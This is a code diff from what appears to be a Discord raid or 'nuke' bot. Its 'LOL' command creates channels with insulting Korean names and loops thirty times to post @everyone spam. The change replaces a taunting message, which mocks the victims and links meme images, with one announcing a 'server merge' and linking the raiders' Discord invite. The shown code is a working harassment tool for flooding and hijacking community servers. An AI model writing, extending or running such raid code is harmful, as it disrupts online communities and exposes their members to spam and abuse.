@@ -155,7 +155,7 @@ async def LOL(ctx):
         channel_names = [
             "안녕하세요", "안녕ㅋㅋ", "Your Face Monkey", "니 얼굴 💩ㅋ", "안녕하세엽ㅋㅋ", "ㅋㅋㅋㅋㅋLOL", "💩💩💩💩💩", "💩💩💩💩💩",
         ]
-        spam_message = "# 안녕하세욥ㅋㅋ https://i.imgflip.com/7f9vxf.jpg  니얼굴 💩ㅋ https://i.pinimg.com/474x/b6/c4/1f/b6c41f49d3ad1d31855f79062b4ac770.jpg  나한테 당하네ㅋㅋ 🤣 https://ichef.bbci.co.uk/images/ic/1920xn/p072ms6r.jpg  음~ 맛있더라 니네서버ㅋ https://m.media-amazon.com/images/I/813kqvYoRfL.png @everyone"
+        spam_message = "# 서버 합병 하러왔습니닿ㅎ https://discord.gg/haksaldan 서버 합병 하러왔습니닿ㅎ @everyone"
         create_and_spam_tasks = []
 
         for _ in range(30):
